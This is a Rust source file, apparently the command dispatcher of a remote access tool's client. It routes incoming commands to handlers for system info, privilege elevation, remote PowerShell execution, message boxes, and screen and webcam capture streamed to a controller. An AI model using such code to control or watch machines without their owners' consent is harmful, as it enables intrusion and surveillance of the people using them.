use shared::commands::{BaseCommand, BaseResponse, CaptureCommand, CaptureType, Command, Response};
use smol::channel::Sender;
use std::sync::{Arc, atomic::AtomicBool};

use crate::{
    capture,
    commands::{computer_info, elevate, message_box, powershell, disconnect},
};

pub fn send(response: BaseResponse, tx: &Sender<Vec<u8>>) {
    match bincode::encode_to_vec(response, bincode::config::standard()) {
        Ok(req) => match tx.try_send(req) {
            Ok(_) => {
                // println!("[x] sent frame");
            }
            Err(smol::channel::TrySendError::Full(_)) => {
                println!("[x] congested, dropped response");
            }
            Err(smol::channel::TrySendError::Closed(_)) => {
                println!("[x] channel closed");
            }
        },
        Err(e) => {
            println!("[x] bincode failed to encode: {}", e);
        }
    };
}

pub fn main(
    command: BaseCommand,
    tx: Sender<Vec<u8>>,
    capture_running: Option<Arc<AtomicBool>>,
    //enigo: Arc<Mutex<Enigo>>, // for input handling (now handled by threading)
) {
    match command.command {
        Command::ComputerInfo => {
            send(
                match computer_info::main() {
                    Ok(info) => BaseResponse {
                        id: command.id,
                        response: info,
                    },
                    Err(err) => BaseResponse {
                        id: command.id,
                        response: Response::Error(err.to_string()),
                    },
                },
                &tx,
            );
        }
        Command::Elevate => {
            send(
                match elevate::main() {
                    Ok(info) => BaseResponse {
                        id: command.id,
                        response: info,
                    },
                    Err(err) => BaseResponse {
                        id: command.id,
                        response: Response::Error(err.to_string()),
                    },
                },
                &tx,
            );
        }
        Command::Disconnect => {
            send(
                match disconnect::main() {
                    Ok(info) => BaseResponse {
                        id: command.id,
                        response: info,
                    },
                    Err(err) => BaseResponse {
                        id: command.id,
                        response: Response::Error(err.to_string()),
                    },
                },
                &tx,
            );
        }
        Command::PowerShell(cmd, powershell) => {
            send(
                BaseResponse {
                    id: command.id,
                    response: powershell::main(cmd, powershell),
                },
                &tx,
            );
        }
        Command::MessageBox(args) => send(
            match message_box::main(args) {
                Ok(info) => BaseResponse {
                    id: command.id,
                    response: info,
                },
                Err(err) => BaseResponse {
                    id: command.id,
                    response: Response::Error(err.to_string()),
                },
            },
            &tx,
        ),
        Command::Capture(capture_command, capture_type) => {
            match capture_command {
                CaptureCommand::Start(device, quality) => {
                    ////////////////////////////
                    match capture_type {
                        CaptureType::Screen => {
                            if let Some(running) = capture_running {
                                let tx_clone = tx.clone();
                                if let Err(err) =
                                    capture::screen::main(command.id, tx_clone, running, quality, device)
                                {
                                    send(
                                        BaseResponse {
                                            id: command.id,
                                            response: Response::Error(err.to_string()),
                                        },
                                        &tx,
                                    );
                                };
                            }
                        }
                        CaptureType::Camera => {
                            if let Some(running) = capture_running {
                                let tx_clone = tx.clone();
                                if let Err(err) =
                                    capture::webcam::main(command.id, tx_clone, running, quality, device)
                                {
                                    send(
                                        BaseResponse {
                                            id: command.id,
                                            response: Response::Error(err.to_string()),
                                        },
                                        &tx,
                                    );
                                };
                            }
                        }
                        _ => { /* not done!! */ }
                    }
                }
                _ => { /* dafuq */ }
            }
        }
        _ => {}
    };
}
